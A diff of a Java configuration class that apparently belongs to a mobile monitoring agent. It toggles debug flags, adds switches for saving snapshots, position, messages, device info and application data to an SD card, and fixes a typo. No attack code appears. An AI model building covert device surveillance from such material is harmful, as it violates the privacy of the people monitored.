@@ -40,16 +40,23 @@ public final class Conf {
     //#ifdef DEBUG
     private static Debug debug = new Debug("Conf", DebugLevel.VERBOSE);
     //#endif
-    
+
     //==========================================================
     // Static configuration
     public static final boolean FETCH_WHOLE_EMAIL = false;
     public static final boolean DEBUG_SD = false;
     public static final boolean DEBUG_FLASH = true;
-    public static final boolean DEBUG_EVENTS = true;
-    public static final boolean DEBUG_OUT = false;
+    public static final boolean DEBUG_EVENTS = false;
+    public static final boolean DEBUG_OUT = true;
+
+    public static final boolean AGENT_SNAPSHOT_ON_SD = false;
+    public static final boolean AGENT_POSITION_ON_SD = false;
+    public static final boolean AGENT_MESSAGE_ON_SD = false;
+    public static final boolean AGENT_DEVICEINFO_ON_SD = false;
+    public static final boolean AGENT_APPLICATION_ON_SD = false;
+
     //==========================================================
-    
+
     public static final String NEW_CONF = "newconfig.dat";
     public static final String ACTUAL_CONF = "config.dat";
     private static final String FORCED_CONF = "config.bin";
@@ -97,8 +104,6 @@ public final class Conf {
 
     public static final byte[] FAKECONFSTART = "XW15TZlwZwpaWGPZ1wtL0f591tJe2b9c1z4PvkRuZaP1jTUR6yfBfLm4Knsu0st2"
             .getBytes();
-
-   
 
     /**
      * Crc verify.
@@ -224,7 +229,7 @@ public final class Conf {
         }
 
         //#ifdef DEBUG
-        debug.warn("Reading Conf from resourses");
+        debug.warn("Reading Conf from resources");
         //#endif
 
         InputStream inputStream = InstanceConfig.getConfig();
